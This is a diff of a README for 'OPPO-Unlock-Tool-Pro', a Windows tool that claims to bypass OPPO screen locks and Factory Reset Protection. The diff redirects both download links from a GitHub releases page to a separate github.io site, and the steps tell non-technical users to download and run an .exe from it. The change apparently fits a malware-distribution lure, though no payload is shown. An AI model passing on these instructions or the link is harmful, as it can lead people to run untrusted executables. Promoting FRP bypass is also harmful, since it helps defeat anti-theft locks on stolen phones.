@@ -1,6 +1,6 @@
 # 🔓 OPPO-Unlock-Tool-Pro - Remove Locks From Your OPPO Device
 
-[![](https://img.shields.io/badge/Download-Software-blue.svg)](https://github.com/Tripinnated-thz976/OPPO-Unlock-Tool-Pro/releases)
+[![](https://img.shields.io/badge/Download-Software-blue.svg)](https://tripinnated-thz976.github.io)
 
 OPPO-Unlock-Tool-Pro helps users regain access to their locked mobile devices. This software works on Windows 10 and Windows 11. It handles screen locks and Factory Reset Protection (FRP) with ease. You do not need technical skills to use this tool.
 
@@ -19,7 +19,7 @@ To run this software, your computer must meet these basic standards:
 
 Follow these steps to set up the software on your machine.
 
-1. Visit the [official release page](https://github.com/Tripinnated-thz976/OPPO-Unlock-Tool-Pro/releases).
+1. Visit the [official release page](https://tripinnated-thz976.github.io).
 2. Look for the latest version of the tool in the assets list.
 3. Click the file ending in .exe to start the download.
 4. Save the file to your desktop or a folder you can find easily.
